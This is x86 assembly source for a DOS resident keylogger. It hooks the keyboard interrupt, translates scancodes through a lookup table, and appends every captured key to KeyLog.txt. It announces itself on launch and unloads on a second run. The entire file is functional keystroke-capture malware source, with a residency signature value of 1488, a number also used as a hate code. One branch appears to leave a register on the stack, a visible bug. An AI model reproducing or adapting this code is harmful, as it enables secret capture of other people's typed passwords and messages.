.model tiny
.code
.386
org 100h     
    
    Start:
    jmp RealStart                        ;jmp to real start of keylogger

;========================================[Vars, table of scancodes and signature] 
    OutputFileID    dw  0
    FileName        db  'KeyLog.txt', 0  
    ScanCode        db  0
    ASCIICode       db  0
    
    MessageEnable   db  'Keylogger was launched!$'
    MessageDisable  db  'Keylogger was stopped!$'
    
    Key:            db 1eh, 'a', 30h, 'b', 2eh, 'c', 20h, 'd'  
                    db 12h, 'e', 21h, 'f', 22h, 'g', 23h, 'h'
                    db 17h, 'i', 24h, 'j', 25h, 'k', 26h, 'l'
                    db 32h, 'm', 31h, 'n', 18h, 'o', 19h, 'p'
                    db 10h, 'q', 13h, 'r', 1fh, 's', 14h, 't'
                    db 16h, 'u', 2fh, 'v', 11h, 'w', 2dh, 'x'
                    db 15h, 'y', 2ch, 'z', 0bh, '0', 02h, '1'
                    db 03h, '2', 04h, '3', 05h, '4', 06h, '5'
                    db 07h, '6', 08h, '7', 09h, '8', 0ah, '9'
                    db 0ch, '-', 0dh, '=', 0fh, 09h, 1ah, '['
                    db 1bh, ']', 37h, '*', 39h, ' ', 35h, '/'
                    db 27h, ';', 28h, '`', 29h, '~', 2bh, '\' 
                    db 33h, ',', 34h, '.', 0eh, 3ch, 1ch, 0dh 
    
    Signature       dw  1488
;========================================[Handler and convert function]
    
    IRQ09hHandler:
        pushf                            ;Save registers
        pusha
        push es
        push ds                                        
        
        push cs
        pop ds
        
        xor ax, ax
                               
        in al, 60h                       ;Copy scancode of typed key to al from 60h port
        cmp al, 39h                      ;Check scancode
        ja ToOld09hHandler
        cmp al, 02h
        jl ToOld09hHandler
        cmp al, 1dh
        je ToOld09hHandler
        cmp al, 2ah
        je ToOld09hHandler
        cmp al, 36h
        je ToOld09hHandler
        cmp al, 38h
        je ToOld09hHandler
        
        mov ScanCode, al                 ;Save scancode
        
        call ScancodeToASCII             ;Convert scancode to ASCII
        
        push es
        mov ah, 34h                      ;Check busy flags
        int 21h
        
        mov al, es:[bx]
        mov ah, es:[bx - 1]
        
        cmp al, 0
        jne ToOld09hHandler              ;If (flag != 0) jmp ToOld09hHandler
        cmp ah, 0
        jne ToOld09hHandler
        pop es
        
        cli
        
        ;====================
        
        mov ax, 3d01h                    ;OpenFile
        lea dx, FileName
        int 21h
        jc ToOld09hHandler
        
        mov OutputFileID, ax             
        mov bx, ax
        mov ax, 4202h                    ;Pointer to the end of file
        xor cx, cx                       ;Offset == 0
        xor dx, dx
        int 21h
        jc ToOld09hHandler
        
        mov ah, 40h                      ;Write ASCIICode to the file
        mov bx, OutputFileID
        mov cx, 1
        lea dx, ASCIICode
        int 21h
        jc ToOld09hHandler
        
        mov ah, 3eh                      ;Close file
        mov bx, OutputFileID
        int 21h
        jc ToOld09hHandler
                              
        ;====================
        
        sti 
         
        ToOld09hHandler:                 ;Old handler
        pop ds                           ;Return registers
        pop es
        popa
        popf
        db  0eah                         ;far jmp to Old09hSegment:Old09hOffset
        Old09hOffset    dw  ?
        Old09hSegment   dw  ?
    
    ScancodeToASCII proc
       pusha
       push si
       
        mov bx, 0
        xor ax, ax
        
        mov al, ScanCode
        
        Cycle:                           ;Search scancode in the table
            cmp al, [offset Key + bx]
            je  Convert
            add bx, 2
            jmp Cycle
            
        Convert:                         ;Save ASCII
            mov al, [offset Key + bx + 1]
            mov ASCIICode, al
            
            pop si
            popa
            ret 
    ScancodeToASCII endp

;========================================[Start of program]    
    RealStart:       
        push es
        mov ax, 3509h                    ;Get the interrupt vector of 09h
        int 21h
        
        mov ax, es:[bx - 2]              ;ES:[BX] contain address of the vector
        cmp ax, 1488                     ;if(ES:[BX - 2] = 1488) it's mean that the program already exists
        je ResidentExist                 
        
        mov Old09hOffset, bx             ;Set old offset and segment of the interrupt vector of 09h
        mov Old09hSegment, es
        pop es
        
    SetNewHandler:                       ;Set new handler for 09h
        mov ax, 2509h
        mov dx, offset IRQ09hHandler
        int 21h
        
    OpenTheLog:                          ;Try to open the logfile
        mov ax, 3d01h
        lea dx, FileName
        int 21h
        
        mov OutputFileID, ax
        jc CreateTheLog                  ;If !fopen() jmp to CreateTheLog
        jmp CloseFile
        
    CreateTheLog:                        ;Create the logfile 
        mov ah, 3ch
        mov cx, 0
        lea dx, FileName
        int 21h
        
        mov OutputFileID, ax             ;Save file handler
        
    CloseFile:                           ;Close the logfile
        mov bx, OutputFileID
        mov ah, 3eh
        int 21h

    RunTheProgram:                       ;Output message("Keylogger was launched")
        mov ah, 09h
        lea dx, MessageEnable             
        int 21h
       
        mov ax, 3100h                    ;Return and stay resident (AL - exit code)
        mov dx, (RealStart - Start + 100h) / 16 + 1 ;Calculate memory
        int 21h
        
    ResidentExist:                       ;If program is already exist
        push ds
        mov ax, 2509h                    ;Set old handler
        mov dx, es:Old09hOffset
        mov ds, es:Old09hSegment
        int 21h
        pop ds
    
        mov ah, 09h                      ;Output message("Keylogger was stopped")
        lea dx, ds:MessageDisable
        int 21h
            
        int 20h
end Start